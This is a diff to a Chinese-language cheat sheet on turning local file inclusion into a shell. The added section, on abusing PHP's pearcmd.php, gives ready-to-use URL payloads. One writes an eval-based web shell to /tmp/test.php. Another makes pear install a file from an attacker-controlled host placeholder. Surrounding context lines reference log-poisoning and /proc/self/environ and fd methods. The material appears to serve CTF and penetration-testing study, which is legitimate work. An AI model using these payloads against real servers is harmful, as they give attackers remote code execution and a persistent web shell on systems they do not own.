@@ -101,6 +101,17 @@ ssh '<?php phpinfo();?>'@remotehost
 - environ文件可读，且知道文件位置
 
 [shell via LFI - proc/self/environ method (exploit-db.com)](https://www.exploit-db.com/papers/12886)
+## pearcmd&peclcmd.php
+php<=7.3默认安装pecl/pear
+pearcmd位置
+- /usr/local/lib/php/pearcmd.php
+payload
+- 创建test文件
+	- `?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=@eval($_POST['cmd']);?>+/tmp/test.php`
+- 下载外界文件
+	- `?+install+--installroot+&file=/usr/local/lib/php/pearcmd.php&+http://[vps]:[port]/test1.php`
+
+
 ## 包含fd
 包含原理是和environ类似的，这里给一篇blog和字典
 https://highon.coffee/blog/lfi-cheat-sheet/#procselffd-lfi-method
